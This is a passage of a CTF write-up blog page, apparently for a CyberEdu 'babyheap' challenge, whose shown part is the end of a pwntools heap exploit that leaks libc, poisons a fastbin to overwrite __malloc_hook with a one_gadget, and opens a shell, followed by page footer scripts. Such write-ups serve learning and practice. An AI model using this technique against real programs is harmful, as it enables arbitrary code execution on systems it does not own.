+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;248&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">247</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>show(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>val <span style="color:#f92672">=</span> u64(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;leaked fd is </span><span style="color:#e6db74">{</span>hex(val)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3c4b78</span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> val <span style="color:#f92672">-</span> leak_offset
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;leaked libc is </span><span style="color:#e6db74">{</span>hex(libc)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#hope this is the same remotely , lol</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#now, let&#39;s restore the size of chunk B so it fits back into fastbins</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#the chunk A is now stored at index 1</span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;E&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">250</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;E&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">248</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x70</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#free chunk B, then free chunk A/E.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#malloc chunk E to overwrite the fd of chunk B. we want that to be find-fake-fast __malloc_hook.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>malloc_hook_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3c4b10</span>
+</span></span><span style="display:flex;"><span>fake_hook_chunk <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> malloc_hook_offset <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x23</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;264&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> p64(fake_hook_chunk))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#restore chunk B&#39;s metadata through chunk E</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>):
+</span></span><span style="display:flex;"><span>    free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>    malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;256&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;E&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">256</span><span style="color:#f92672">-</span>i))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;E&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">248</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x70</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#chunk B</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;104&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">103</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>one_gadget <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf02a4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#malloc_hook</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;104&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">19</span>) <span style="color:#f92672">+</span> p64(one_gadget) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">65</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(p, gdbscript = &#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#b * &amp;__malloc_hook</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#c</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#&#39;&#39;&#39;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#one last malloc</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;24&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;F&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">23</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<p>As always, the full code can be found on my GitHub
+<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/babyheap.py">here</a></strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/heap/">Heap</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
